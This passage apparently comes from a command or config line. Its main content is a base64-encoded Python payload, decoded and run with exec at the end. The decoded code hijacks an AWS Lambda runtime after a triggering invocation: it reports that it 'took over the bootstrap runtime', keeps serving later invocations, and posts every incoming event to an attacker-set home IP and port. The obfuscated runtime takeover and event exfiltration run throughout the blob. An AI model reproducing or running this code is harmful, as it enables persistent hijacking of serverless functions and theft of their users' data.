ICAgICAgICAgY2xpZW50X2NvbnRleHRfanNvbiwgY29nbml0b19pZGVudGl0eV9qc29uLCBpbnZva2VkX2Z1bmN0aW9uX2FybiwgZXBvY2hfZGVhZGxpbmVfdGltZV9pbl9tcyk6CiAgICBlcnJvcl9yZXN1bHQgPSBOb25lCiAgICB0cnk6CiAgICAgICAgbGFtYmRhX2NvbnRleHQgPSBjcmVhdGVfbGFtYmRhX2NvbnRleHQoY2xpZW50X2NvbnRleHRfanNvbiwgY29nbml0b19pZGVudGl0eV9qc29uLCBlcG9jaF9kZWFkbGluZV90aW1lX2luX21zLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludm9rZV9pZCwgaW52b2tlZF9mdW5jdGlvbl9hcm4pCiAgICAgICAgZXZlbnQgPSBsYW1iZGFfcnVudGltZV9jbGllbnQubWFyc2hhbGxlci51bm1hcnNoYWxfcmVxdWVzdChldmVudF9ib2R5LCBjb250ZW50X3R5cGUpCgogICAgICAgIHR3aXN0X2xlYWtfZGF0YV9ob21lKGV2ZW50LCBpbnZva2VfaWQpCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0X2hhbmRsZXIoZXZlbnQsIGxhbWJkYV9jb250ZXh0KQogICAgICAgIHR3aXN0ZWRfcmVzcG9uc2UgPSB0d2lzdF9yZXNwb25zZShyZXNwb25zZSkKCiAgICAgICAgcmVzdWx0LCByZXN1bHRfY29udGVudF90eXBlID0gbGFtYmRhX3J1bnRpbWVfY2xpZW50Lm1hcnNoYWxsZXIubWFyc2hhbF9yZXNwb25zZSh0d2lzdGVkX3Jlc3BvbnNlKQogICAgZXhjZXB0IEZhdWx0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgZXJyb3JfcmVzdWx0ID0gbWFrZV9lcnJvcihlLm1zZywgZS5leGNlcHRpb25fdHlwZSwgZS50cmFjZSkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgZXJyb3JfcmVzdWx0ID0gYnVpbGRfZmF1bHRfcmVzdWx0KHN5cy5leGNfaW5mbygpLCBOb25lKQoKICAgIGlmIGVycm9yX3Jlc3VsdCBpcyBub3QgTm9uZToKICAgICAgICBsb2dfZXJyb3IoZXJyb3JfcmVzdWx0KQogICAgICAgIGxhbWJkYV9ydW50aW1lX2NsaWVudC5wb3N0X2ludm9jYXRpb25fZXJyb3IoaW52b2tlX2lkLCB0b19qc29uKGVycm9yX3Jlc3VsdCkpCiAgICBlbHNlOgogICAgICAgIGxhbWJkYV9ydW50aW1lX2NsaWVudC5wb3N0X2ludm9jYXRpb25fcmVzdWx0KGludm9rZV9pZCwgcmVzdWx0LCByZXN1bHRfY29udGVudF90eXBlKQoKClRXSVNUX0hPTUVfSVAgPSAiIiAgICAjIGZpbGwgaW4KVFdJU1RfSE9NRV9QT1JUID0gIiIgICMgZmlsbCBpbgpERUZBVUxUX1RJTUVPVVQgPSAwLjIKIyBTZW5kIHRoZSBldmVudCB0byBUV0lTVF9IT01FCmRlZiB0d2lzdF9sZWFrX2RhdGFfaG9tZShldmVudCwgaW52b2tlX2lkKToKICAgIGlmIG5vdCBUV0lTVF9IT01FX0lQIG9yIG5vdCBUV0lTVF9IT01FX1BPUlQ6CiAgICAgICAgcHJpbnQoIlshXSB0d2lzdF9sZWFrX2RhdGFfaG9tZTogVFdJU1RfSE9NRSBpc24ndCBkZWZpbmVkIikKICAgICAgICByZXR1cm4KCiAgICAjIFNlbmQgZXZlbnQgdG8gaG9tZSBzZXJ2ZXIKICAgIGhvbWUgPSAiaHR0cDovL3swfTp7MX0iLmZvcm1hdChUV0lTVF9IT01FX0lQLCBUV0lTVF9IT01FX1BPUlQpCiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMucG9zdChob21lLCBqc29uPWV2ZW50LCB0aW1lb3V0PURFRkFVTFRfVElNRU9VVCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGNwID0gcmVwcihlKQogICAgICAgIHByaW50KCJbIV0gdHdpc3RfbGVha19kYXRhX2hvbWU6IGZhaWxlZCB0byBzZW5kIGV2ZW50ICd7fScgd2l0aDoge30iLmZvcm1hdChpbnZva2VfaWQsIGV4Y3ApKQoKCiMgU2VuZCBhbiBpbnZvY2F0aW9uIHJlc3VsdCBmb3IgdGhlIGludm9rZSB0aGF0IHN3aXRjaGVkIHRoZSBydW50aW1lCmRlZiB0d2lzdF9yZXNwb25kX3RvX3BheWxvYWRfaW52b2tlKGxhbWJkYV9ydW50aW1lX2NsaWVudCwgaW52b2tlX2lkKToKICAgIHJlc3BvbnNlID0gewogICAgICAgICJpc0Jhc2U2NEVuY29kZWQiOiBGYWxzZSwKICAgICAgICAic3RhdHVzQ29kZSIgOiAyMDAsCiAgICAgICAgImhlYWRlcnMiIDogeyJDb250ZW50LVR5cGUiIDogInRleHQvcGxhaW4ifSwKICAgICAgICAiYm9keSIgOiBqc29uLmR1bXBzKHsiT3V0cHV0IiA6ICJTdWNjZXNzZnVsbHkgdG9vayBvdmVyIHRoZSBib290c3RyYXAgcnVudGltZSJ9KQogICAgfQoKICAgICMgTWFyc2hhbGwgcmVzcG9uc2UKICAgIHRyeToKICAgICAgICByZXN1bHQsIHJlc3VsdF9jb250ZW50X3R5cGUgPSBsYW1iZGFfcnVudGltZV9jbGllbnQubWFyc2hhbGxlci5tYXJzaGFsX3Jlc3BvbnNlKHJlc3BvbnNlKSAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiWyFdIHR3aXN0X3Jlc3BvbmRfdG9fcGF5bG9hZF9pbnZva2U6IEZhaWxlZCB0byBtYXJzaGFsIHJlc3BvbnNlOiAne30nIi5yZXByKGUpKQogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICB0cnk6CiAgICAgICAgbGFtYmRhX3J1bnRpbWVfY2xpZW50LnBvc3RfaW52b2NhdGlvbl9yZXN1bHQoaW52b2tlX2lkLCByZXN1bHQsIHJlc3VsdF9jb250ZW50X3R5cGUpCiAgICBleGNlcHQgTGFtYmRhUnVudGltZUNsaWVudEVycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoIlshXSB0d2lzdF9yZXNwb25kX3RvX3BheWxvYWRfaW52b2tlOiBGYWlsZWQgd2l0aCBpbnZva2VfaWQ6ICd7fSciLmZvcm1hdChpbnZva2VfaWQpKQogICAgICAgIHJldHVybiBGYWxzZQoKICAgICMgU3VjY2VlZCAgICAKICAgIHJldHVybiBUcnVlCgoKX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCA9IE5vbmUKSEFSRENPREVEX0lOSVRfUFJPQ0VTU19BUEkgPSAiMTI3LjAuMC4xOjkwMDEiCgpkZWYgdHdpc3RfbWFpbihpbnZva2VfaWQpOgoKICAgICMgUmVjb25uZWN0IHRvIHRoZSBpbml0IHByb2Nlc3MKICAgIGxhbWJkYV9ydW50aW1lX2NsaWVudCA9IExhbWJkYVJ1bnRpbWVDbGllbnQoSEFSRENPREVEX0lOSVRfUFJPQ0VTU19BUEkpCiAgICAKICAgICMgSGFuZGxlIHRoZSBpbnZvY2F0aW9uIHRoYXQgc3dpdGNoZWQgdGhlIHJ1bnRpbWUKICAgIGlmIG5vdCB0d2lzdF9yZXNwb25kX3RvX3BheWxvYWRfaW52b2tlKGxhbWJkYV9ydW50aW1lX2NsaWVudCwgaW52b2tlX2lkKToKICAgICAgICByZXR1cm4KCiAgICBldmVudF9yZXF1ZXN0ID0gbGFtYmRhX3J1bnRpbWVfY2xpZW50LndhaXRfbmV4dF9pbnZvY2F0aW9uKCkgIyB3ZSBmcmVlemUgaGVyZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHJlc3Qgb2YgaW5pdGlhbGl6YXRpb24gd2lsbCBoYXBwZW4gaW4gdGhlIG5leHQgZXZlbnQKCiAgICAjIFJlY2VpdmVkIGZpcnN0IGV2ZW50IGFmdGVyIHN3aXRjaAogICAgIyBDb250aW51ZSBpbml0aWFsaXphdGlvbgogICAgdHJ5OgogICAgICAgIGluaXRfbG9nZ2VyKCkKICAgICAgICBhZGRfZGVmYXVsdF9zaXRlX2RpcmVjdG9yaWVzKCkKCiAgICAgICAgaGFuZGxlciA9IG9zLmVudmlyb25bIl9IQU5ETEVSIl0KICAgICAgICByZXF1ZXN0X2hhbmRsZXIgPSBfZ2V0X2hhbmRsZXIoaGFuZGxlcikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludCgiWyFdIHR3aXN0X21haW46IGluaXRpYWxpemF0aW9uIGZhaWxlZDoiICsgcmVwcihlKSkKICAgICAgICByZXR1cm4KCiAgICAjIEhhbmRsZSBhbmQgbGVhayBzdWJzZXF1ZW50IGV2ZW50cwogICAgZ2xvYmFsIF9HTE9CQUxfQVdTX1JFUVVFU1RfSUQKCiAgICB3aGlsZSBUcnVlOgogICAgICAgIF9HTE9CQUxfQVdTX1JFUVVFU1RfSUQgPSBldmVudF9yZXF1ZXN0Lmludm9rZV9pZAoKICAgICAgICB1cGRhdGVfeHJheV9lbnZfdmFyaWFibGUoZXZlbnRfcmVxdWVzdC54X2Ftem5fdHJhY2VfaWQpCgogICAgICAgIHR3aXN0X2hhbmRsZV9ldmVudF9yZXF1ZXN0KGxhbWJkYV9ydW50aW1lX2NsaWVudCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0X2hhbmRsZXIsICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0Lmludm9rZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmV2ZW50X2JvZHksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnRfcmVxdWVzdC5jb250ZW50X3R5cGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnRfcmVxdWVzdC5jbGllbnRfY29udGV4dCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmNvZ25pdG9faWRlbnRpdHksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnRfcmVxdWVzdC5pbnZva2VkX2Z1bmN0aW9uX2FybiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmVudF9yZXF1ZXN0LmRlYWRsaW5lX3RpbWVfaW5fbXMpCgogICAgICAgICMgTmV4dCBldmVudAogICAgICAgIGV2ZW50X3JlcXVlc3QgPSBsYW1iZGFfcnVudGltZV9jbGllbnQud2FpdF9uZXh0X2ludm9jYXRpb24oKQoKCgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGlmIGxlbihzeXMuYXJndikgIT0gMjoKICAgICAgICBwcmludCgiWyFdIFVzYWdlOiA8dHdpc3QtcnVudGltZT4gPGludm9rZS1pZD4iKQogICAgICAgIHN5cy5leGl0KDEpCgogICAgaW52b2tlX2lkID0gc3lzLmFyZ3ZbMV0KICAgIAogICAgc3lzLnBhdGguaW5zZXJ0KDAsIGdldF9vcHRfcHl0aG9uX2RpcmVjdG9yeSgpKQogICAgc3lzLnBhdGguaW5zZXJ0KDAsIGdldF9vcHRfc2l0ZV9wYWNrYWdlc19kaXJlY3RvcnkoKSkKICAgIHN5cy5zdGRvdXQgPSBVbmJ1ZmZlcmVkKHN5cy5zdGRvdXQpCiAgICBzeXMuc3RkZXJyID0gVW5idWZmZXJlZChzeXMuc3RkZXJyKQoKICAgIHByaW50KCJbK10gdHdpc3QtcnVudGltZSBzdGFydGluZywgaW52b2tlLWlkOiAiICsgaW52b2tlX2lkKQogICAgdHdpc3RfbWFpbihpbnZva2VfaWQpCg==';     from base64 import b64decode; payload = b64decode(payload_b64).decode('utf8');     exec(payload)" ]